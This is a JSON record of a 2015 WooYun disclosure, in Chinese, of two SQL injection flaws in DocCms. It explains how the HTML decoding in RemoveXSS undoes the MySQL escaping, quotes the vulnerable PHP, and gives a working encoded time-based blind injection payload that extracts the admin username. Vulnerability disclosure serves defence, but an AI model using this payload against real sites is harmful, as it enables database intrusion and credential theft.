{"id": 30811, "wybug_id": "wooyun-2015-0115644", "wybug_title": " DocCms绕过防注进行SQL注入2枚打包，无视GPC", "wybug_corp": "DocCms", "wybug_author": "路人甲", "wybug_date": "2015-05-26 10:41", "wybug_open_date": "2015-07-10 10:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  DocCms绕过防注进行SQL注入2枚打包，无视GPC 详细说明：  用户量依然是这么大~~首先大致说下这个SQL是如何产生的，看到 WooYun: DocCms最新版sql注入漏洞 ，它利用url编码绕过过滤进行了注入，就有了点点想法，会不会还有其他编码绕过过滤的问题？先把注入点和注入参数拿出来吧，便于审核大大们查看是否有重复：注入点是前台用户注册的地方（会员中心----基本资料----编辑，doccms的各个模块后台都是可以打开或关闭的，本地测试时，如果没有打开，请后台自行打开），注入参数为：nickname、sex下面来研究一下如何绕过防注系统：Doccms中首先对输入进行了全局过滤，但是后面为了过滤XSS，又对经过全局过滤的用户输入进行了html解码，因此，可以通过编码绕过过滤进行注入。Doccms在/loader/doc.php对输入的内容进行了全局的过滤，如下\n$_REQUEST = cleanArrayForMysql($_REQUEST);$_GET     = cleanArrayForMysql($_GET);$_POST    = cleanArrayForMysql($_POST);$request  = $_REQUEST;\n跟进cleanArrayForMysql看一下，/inc/function.php\nfunction cleanArrayForMysql($data){\tif(!get_magic_quotes_gpc())\t\treturn (is_array($data))?array_map('cleanArrayForMysql', $data):mysql_real_escape_string($data);\telse\t\treturn $data;}\n可以看到对用户的输入调用了mysql_real_escape_string()进行过滤，这个函数把sql的几个特殊字符过滤掉了，特别是’,但是这个函数并不过滤%,后面会用到这个特性。在用户有输入的地方，doccms对用户的输入进行XSS过滤。比如本次注入的地方，在 会员中心，注册新会员时，会调用/content/user/index.php 文件中的reg函数\nfunction edit(){\tchecklogin();\tglobal $db;\tglobal $request;\tglobal $tag;\t\tif($_POST)\t{\t\tforeach ($request as $k=>$v)\t\t{\t\t\t$request[$k]=RemoveXSS($v);\t\t}\t\t//必填验证\t\trequire(ABSPATH.'/inc/class.validate.php');\t\tif(!validate::is_email($request['email'])){\t\t\tdie('请确认邮箱填写正确！');\t\t}\t\trequire(ABSPATH.'/inc/models/user.php');\t\t$user = new c_user();\t\t$user->id=$_SESSION[TB_PREFIX.'user_ID'];\t\t\t\t$user->name=$request['name'];\t\t$user->email=$request['email'];\t\t$user->nickname=$request['nickname'];\t\t$user->age=$request['age'];\t\t$user->mtel=$request['etel'];\t\t$user->sex=$request['sex'];\t\t$user->qq=$request['qq'];\t\t$user->msn=$request['msn'];\t\t$user->email=$request['email'];\t\t$user->address=$request['address'];\t\tif($user->save())\t\t{\t\t\t\tredirect(sys_href($request['p'],'user','edit'));\t\t\t\t}else{\t\t\texit('<script language=\"javascript\">alert(\"修改失败!\");history.back(1);</script>');\t\t}\t}else{\t\tglobal $user;\t\t$sql=\"SELECT * FROM \".TB_PREFIX.\"user WHERE id=\".$_SESSION[TB_PREFIX.'user_ID'];\t\t$user = $db->get_row($sql);\t}}\n可以看到\nforeach ($request as $k=>$v)\t\t{\t\t\t$request[$k]=RemoveXSS($v);\t\t}\n调用了RemoveXSS()函数，RemoveXSS()内容如下\nfunction RemoveXSS($val) {     // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed     // this prevents some character re-spacing such as <java\\0script>     // note that you have to handle splits with \\n, \\r, and \\t later since they *are* allowed in some          // inputs     $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val);         // straight replacements, the user should never need these since they're normal characters     // this prevents like <IMG SRC=@avascript:alert('XSS')>     $search = 'abcdefghijklmnopqrstuvwxyz';     $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';     $search .= '1234567890!@#$%^&*()';     $search .= '~`\";:?+/={}[]-_|\\'\\\\';     for ($i = 0; $i < strlen($search); $i++) {         // ;? matches the ;, which is optional         // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars         // @ @ search for the hex values         $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val);//with a ;         // @ @ 0{0,7} matches '0' zero to seven times         $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ;     }     // now the only remaining whitespace attacks are \\t, \\n, and \\r     $ra1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');     $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');     $ra = array_merge($ra1, $ra2);        $found = true; // keep replacing as long as the previous round replaced something     while ($found == true) {         $val_before = $val;         for ($i = 0; $i < sizeof($ra); $i++) {             $pattern = '/';             for ($j = 0; $j < strlen($ra[$i]); $j++) {                 if ($j > 0) {                     $pattern .= '(';                     $pattern .= '(&#[xX]0{0,8}([9ab]);)';                     $pattern .= '|';                     $pattern .= '|(&#0{0,8}([9|10|13]);)';                     $pattern .= ')*';                 }                 $pattern .= $ra[$i][$j];             }             $pattern .= '/i';             $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2); // add in <> to nerf the tag             $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags             if ($val_before == $val) {                 // no replacements were made, so exit the loop                 $found = false;             }         }     }     return $val; }\n为了更好的过滤XSS，RemoveXSS把用户输入进行了html解码，因而整个流程是这样的：用户输入内容--->mysql_real_escape_string()---->RemoveXSS()---->mysql_query(),也就是说用户输入内容首先被mysql_real_escape_string()过滤掉sql特殊字符，然后RemoveXSS()进行html解码，最后执行sql语句。因此问题就来了，先把SQL特殊字符进行html编码，绕过mysql_real_escape_string()，然后由RemoveXSS()解码还原，然后就可以执行了，注入也就产生了。这样产生的注入虽然可以引入’,但是由于RemoveXSS()无法使用逗号，这也给注入带来了点点麻烦。不过不用逗号一样可以构造注入语句。注入不能使用逗号，且注入是在insert处，因此使用case when then 进行注入，可以有效的避开逗号问题。因是在insert的values中构造注入语句，又不能使用逗号，暂时没想到如何使用case when then +bool-based 来注入。本次注入使用case when then +time-based blind进行注入。以“sex”为例进行验证：Payload（html编码前）：\nusername=test&nickname=&name=&sex=’ or (select case when (select username from (select * from doc_user) as a where id=1) like ‘a%’ then sleep(3) else sleep(0) end) or ‘&age=&etel=&email=test%40163.com&qq=&msn=&address=\n编码以后的payload为：\nusername=test&nickname=&name=&sex=%26%23%78%32%37%3B or (select case when (select username from (select * from doc_user) as a where id=1) like %26%23%78%32%37%3Ba%%26%23%78%32%37%3B then sleep(3) else sleep(0) end) or %26%23%78%32%37%3B&age=&etel=&email=test%40163.com&qq=&msn=&address=\nTime-based blind 注入\n\n根据提交成功返回的时间即可判断doc_user中第一个用户的用户名是不是以a开头的，若是返回时间约为5s。可以使用burpsuite辅助测试或写个脚本进行时间盲注。最后测试的结果为管理员用户名为admin   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-06-14 10:34 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  求公开。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}